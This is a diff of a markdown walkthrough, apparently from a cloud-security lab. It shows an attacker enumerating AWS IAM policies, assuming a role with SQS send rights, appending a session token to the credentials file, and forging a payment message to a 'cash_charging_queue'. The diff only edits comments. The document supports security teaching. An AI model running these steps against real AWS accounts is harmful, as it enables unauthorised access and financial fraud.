@@ -10,17 +10,22 @@
 
 2. The attacker checks the privileges it has
     ```bash
-    # This command will configure AWS CLI settings for a specific profile, allowing you to set credentials
+    # Configure AWS CLI settings for a specific profile, allowing you to set credentials
     aws configure --profile [profile_name]
-    # This command will give you the ARN & full name of you user.
+   
+    # Get the ARN & full name of user.
     aws --profile [profile_name] sts get-caller-identity
-    # This command will list the policies attached to your user.
+   
+    # List policies attached to user.
     aws --profile [profile_name] iam list-user-policies --user-name [user_name]
-    # This command will view the permissions granted to inline policies.
+   
+    # View permissions granted to inline policies.
     aws --profile [profile_name] iam get-user-policy --user-name [user_name] --policy-name [policy_name]
-    # This command will view the inline policies granted to role.
+    
+   # View inline policies granted to role.
     aws --profile [profile_name] iam list-role-policies --role-name [role_name]
-    # This command will view the permissions granted to inline policies.
+    
+   # View permissions granted to inline policies.
     aws --profile [profile_name] iam get-role-policy --role-name [role_name] --policy-name [policy_name]
     ```  
     ※ Attacker finds that they have assume-role privileges for a particular role.  
@@ -44,11 +49,13 @@
 
 4. Assume the the sending message role about SQS service
     ```bash
-    # This command will get you credentials for the role that can send message to SQS service
+    # Get credentials for the role about sending messages to SQS queue.
     aws --profile [profile_user] sts assume-role --role-arn [role_arn] --role-session-name [whatever_you_want_here]
-    # This command will configure AWS CLI settings for a specific profile, allowing you to set credentials 
+    
+   # Configure AWS profile.
     aws configure --profile [assumed_profile_name]
-    # This command will appends the obtained session token to the ~/.aws/credentials file
+    
+   # Set the session token to ~/.aws/credentials.
     echo "aws_session_token = {token}" >> ~/.aws/credentials
     ```  
   
@@ -56,9 +63,10 @@
   
 5. The attacker, who possesses the necessary permissions, sends a forged message to the SQS service queue  
     ```bash
-    # This command wil get you queue-url of SQS service
+    # Get queue-url of SQS service
     aws --profile [assumed_profile_name] sqs get-queue-url --queue-name cash_charging_queue
-    # This command wil sends a forged message to the SQS service queue
+    
+   # Send a forged message to the SQS service queue
     aws --profile [assumed_profile_name] sqs send-message --queue-url [queue_url] --message-body '{"charge_amount": 100000000}'
     ```  
   
